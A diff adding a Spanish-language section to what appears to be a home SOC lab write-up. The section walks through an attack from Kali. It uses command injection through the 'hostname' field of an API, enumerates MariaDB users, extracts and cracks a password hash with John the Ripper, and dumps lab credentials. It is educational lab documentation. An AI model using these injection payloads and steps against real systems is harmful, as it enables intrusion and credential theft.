@@ -70,7 +70,7 @@ El laboratorio SOC cuenta con dos redes segmentadas, separando el entorno de ata
 Esta sección documenta la fase ofensiva del de este desde la perspectiva del atacante. Kali Linux actúa como origen del ataque contra la Red de Laboratorio, con el objetivo de vulnerar una API expuesta en Ubuntu Server, utilizarla como punto de pivote hacia el contenedor MariaDB, y obtener credenciales que permitan avanzar hacia el resto de la infraestructura.  
 
 
-- ## Acceso Inicial 
+- ## API Exploitation & Initial Access
 
 En esta fase parto de una API expuesta en Ubuntu Server, sin saber todavía qué hay detrás de ella. El primer objetivo es lograr ejecución de comandos sobre el servidor, y una vez conseguido eso, empiezo a reconocer el entorno de red para entender dónde estoy parado y qué otros servicios podrían estar corriendo cerca
 
@@ -177,4 +177,200 @@ curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/
 
 </div>
 
+
+*****
+
+*Con la conexión a MariaDB confirmada, doy por finalizada la fase de Acceso Inicial. La API vulnerable permitió ejecutar comandos sobre el servidor y utilizarlo como punto de acceso hacia la red interna, donde pude identificar un host activo y acceder al servicio MariaDB.*
+
+****
+
+
+
+ - ## Database Discovery & Credential Access
+
+Con el acceso a MariaDB confirmado, comienzo a enumerar la base de datos para identificar su estructura, usuarios y credenciales. El objetivo es obtener información sensible que permita ampliar el acceso y continuar avanzando sobre la infraestructura.
+
+### ☑️ [2.1] — Conexión anónima + enumeración de usuarios 
+
+Con la conexión a MariaDB confirmada, intento acceder sin especificar un usuario y consulto la tabla mysql.user. El objetivo es identificar las cuentas existentes en el servidor
+
+```
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u \"\" -e \"SELECT user FROM mysql.user;\""}'
+```
+
+<div>
+
+  <img width="1004" height="274" alt="mariadbpaso2 1" src="https://github.com/user-attachments/assets/56455771-f532-422b-a8f4-c1e0ada552bc" />
+
+</div>
+
+
+---
+
+### ☑️  [2.2] — Acceso con TCFD
+
+Con los usuarios identificados pruebo primero con el user TCFD identificado , intento autenticarme en MariaDB utilizando esta cuenta. Ejecuto una consulta de validación para comprobar si el usuario dispone de acceso efectivo al servicio
+
+```
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT 1;\""}'
+```
+
+<div>
+<img width="996" height="193" alt="paso2 2maria" src="https://github.com/user-attachments/assets/ea5fb4db-7479-4529-b85b-9bcc027a749a" />
+
+</div>
+
+
+---
+
+### ☑️ [2.3] — Identificación del usuario actual
+
+Con el acceso mediante TCFD confirmado, valido la identidad efectiva de la sesión utilizando CURRENT_USER(). El resultado confirma que la conexión se está ejecutando como TCFD@172.18.0.2, estableciendo el contexto de usuario desde el que continuaré la enumeración.
+
+```
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT CURRENT_USER();\""}'
+```
+
+<div>
+
+<img width="991" height="202" alt="paso2 3maria" src="https://github.com/user-attachments/assets/275cd7e4-1046-4f16-af9a-6fff46f55a33" />
+
+  
+</div>
+
+
+---
+
+### ☑️ [2.4] — Extracción del hash de labadmin 
+
+Con la identidad de la sesión confirmada, consulto mysql.user para obtener el valor de authentication_string asociado a labadmin. El resultado expone el hash de autenticación almacenado por MariaDB, proporcionando material que puede utilizarse para una posterior etapa de análisis de credenciales.
+
+```
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u TCFD -e \"SELECT user, authentication_string FROM mysql.user WHERE user='\''labadmin'\'';\""}'
+```
+
+<div>
+<img width="998" height="219" alt="paso2 4maria" src="https://github.com/user-attachments/assets/98c4efb5-71e6-4086-a4a0-a2661e37fff5" />
+
+  
+</div>
+
+
+```text
+labadmin
+*A0F874BC7F54EE086FCE60A37CE7887D8B31086B
+```
+
+--- 
+
+### ☑️ [2.5] — Cracking offline 
+
+En esta etapa intento recuperar la contraseña a partir del hash, trabajando de forma offline sobre Kali. Utilizo John the Ripper con el diccionario rockyou.txt, que prueba diferentes contraseñas hasta encontrar una que genere el mismo hash.
+
+```bash
+echo "labadmin:*A0F874BC7F54EE086FCE60A37CE7887D8B31086B" > hash_labadmin.txt
+```
+
+Se ejecuta John the Ripper:
+
+```bash
+john hash_labadmin.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=mysql-sha1
+```
+```text
+user: labadmin 
+Password: password123
+```
+<div>
+
+  <img width="1002" height="318" alt="jonhtriper" src="https://github.com/user-attachments/assets/978db4b8-8639-4946-8e8f-6f0f1883ddf6" />
+
+</div>
+
+
+--- 
+
+### ☑️ [2.6] — Autenticación con labadmin
+
+Con la contraseña obtenida mediante el proceso de cracking offline, intento autenticarme en MariaDB utilizando la cuenta labadmin. Una vez autenticado, consulto las bases disponibles para validar los privilegios de acceso obtenidos y continuar con la enumeración.
+
+
+```
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"SHOW DATABASES;\""}'
+```
+
+<div>
+ <img width="994" height="135" alt="paso2 6maria" src="https://github.com/user-attachments/assets/61e10671-cb12-4cd3-a264-6fc5b0b0eb49" />
+</div>
+
+
+--- 
+
+### ☑️ [2.7] — Enumeración de tablas 
+
+Con corporate_assets identificada como objetivo, enumero sus tablas para conocer la estructura de la información almacenada y localizar aquellas que puedan contener datos relevantes. 
+
+```bash
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SHOW TABLES;\""}'
+```
+
+<div>
+
+  <img width="1014" height="130" alt="paso2 7maria" src="https://github.com/user-attachments/assets/a25d3404-e235-4c55-876b-b3a7a6e792a1" />
+
+</div>
+
+
+--- 
+
+### ☑️ [2.8] — Enumeración de endpoints 
+
+Con las tablas identificadas, consulto los registros de endpoints mediante SELECT *. El objetivo es obtener la información almacenada en esa tabla y analizar los equipos registrados en la base de datos.
+
+```bash
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SELECT * FROM endpoints;\""}'
+```
+
+<div>
+
+<img width="996" height="194" alt="paso2 8maria" src="https://github.com/user-attachments/assets/fdb16b1a-b6ba-461d-a43e-073b57f507f1" />
+
+  
+</div>
+
+
+
+- mariadb-prod          Database    172.18.0.3           3306     active
+- web-server            SSH         192.168.3.100        22       active
+- **`windows-srv `**    Windows     192.168.3.10         3389     active
+
+
+
+### ☑️ [2.9] — Exfiltración de credenciales
+
+La consulta expone los registros almacenados en credentials, incluyendo usuarios y contraseñas asociadas a distintos servicios y equipos del laboratorio. Esta información amplía el alcance del acceso obtenido y proporciona credenciales que pueden ser utilizadas para intentar autenticación sobre otros endpoints de la infraestructura.
+
+```bash
+curl -X POST http://192.168.3.100:8080/check-host -H "Content-Type: application/json" -d '{"hostname":"127.0.0.1; mariadb -h 172.18.0.3 --skip-ssl -u labadmin -p'\''password123'\'' -e \"USE corporate_assets; SELECT * FROM credentials;\""}'
+```
+
+<div>
+
+  <img width="998" height="203" alt="paso2 9" src="https://github.com/user-attachments/assets/01623ae4-c3d7-4580-b96d-d545573ec938" />
+
+</div> 
+
+- dbadmin — DBLab-2026-01
+- webadmin — WebLab-2026-02
+- **`administrador`** — WinLab-2026-03
+- svc_backup — BackupLab-2026-04
+- backup_operator — BackupLab-2026-05
+- fin_user — FinanceLab-2026-06
+
+*****
+Esta fase permitió ampliar el acceso inicial obtenido sobre la infraestructura, pasando de un acceso al servicio MariaDB a disponer de información interna de la organización. La base de datos expuso información sobre sistemas, usuarios y credenciales almacenadas, permitiendo identificar relaciones entre los datos y los distintos endpoints del laboratorio.
+
+Como resultado, se obtuvo una credencial asociada a un usuario con presencia en otro endpoint de la red, proporcionando información de autenticación que amplía el alcance del acceso conseguido y permite validar hasta dónde puede extenderse el compromiso dentro de la infraestructura.
+
+
+*****
 
